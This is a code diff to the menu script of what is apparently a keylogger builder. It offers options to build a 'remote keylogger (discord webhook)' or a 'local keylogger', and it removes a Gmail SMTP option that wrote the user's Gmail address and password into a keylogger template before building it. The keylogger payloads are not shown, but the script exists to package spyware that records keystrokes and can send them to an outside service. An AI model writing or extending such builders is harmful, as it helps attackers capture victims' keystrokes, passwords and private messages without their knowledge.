@@ -4,7 +4,6 @@
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
 import os
-from getpass import getpass
 import subprocess
 from colorama import init, Fore
 
@@ -87,12 +86,9 @@ def main():
             f"\n{Fore.LIGHTYELLOW_EX}1{Fore.RESET} - {Fore.LIGHTGREEN_EX}remote keylogger (discord webhook)"
         )
         print(
-            f"{Fore.LIGHTYELLOW_EX}2{Fore.RESET} - {Fore.LIGHTGREEN_EX}remote keylogger (gmailsmtp)"
+            f"{Fore.LIGHTYELLOW_EX}2{Fore.RESET} - {Fore.LIGHTGREEN_EX}local keylogger"
         )
-        print(
-            f"{Fore.LIGHTYELLOW_EX}3{Fore.RESET} - {Fore.LIGHTGREEN_EX}local keylogger"
-        )
-        print(f"{Fore.LIGHTYELLOW_EX}4{Fore.RESET} - {Fore.LIGHTGREEN_EX}exit")
+        print(f"{Fore.LIGHTYELLOW_EX}3{Fore.RESET} - {Fore.LIGHTGREEN_EX}exit")
         choice = input("\nEnter your choice: ")
         try:
             choice = int(choice)
@@ -116,40 +112,10 @@ def main():
                 pass
             break
         elif choice == 2:
-            print(f"\n{Fore.LIGHTYELLOW_EX}WARNING:{Fore.RESET}")
-            print(f"1. You need to either enable {Fore.LIGHTYELLOW_EX}'Less secure app access'{Fore.RESET} in your Google Account settings.")
-            print(f"2. Your Gmail password will be {Fore.LIGHTRED_EX}stored in plain text{Fore.RESET} in the file and will {Fore.LIGHTRED_EX}not be encrypted{Fore.RESET}!")
-            print(f"3. Please use a {Fore.LIGHTRED_EX}non-important{Fore.RESET} Google account for security reasons!!!")
-            choice2 = input("\nAre you sure you want to continue? (y/n): ")
-            if choice2.strip().lower() == "y" or choice2.strip().lower() == "yes":
-                pass
-            else:
-                print(choice2)
-                continue
-            gmail_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "gmail", "keylogger.py")
-            email = input("\nEnter your gmail: ")
-            password = getpass("Enter your password: ")
-            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
-            with open(gmail_path, "r", encoding="utf-8") as f:
-                content = f.read()
-            with open(python_file, "w", encoding="utf-8") as f:
-                f.write(
-                    content.replace("YOUR_GMAIL", email).replace(
-                        "YOUR_PASSWORD", password
-                    )
-                )
-
-            build()
-            try:
-                os.remove(python_file)
-            except (FileNotFoundError, PermissionError):
-                pass
-            break
-        elif choice == 3:
             python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "local", "keylogger.py")
             build()
             break
-        elif choice == 4:
+        elif choice == 3:
             break
         else:
             print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
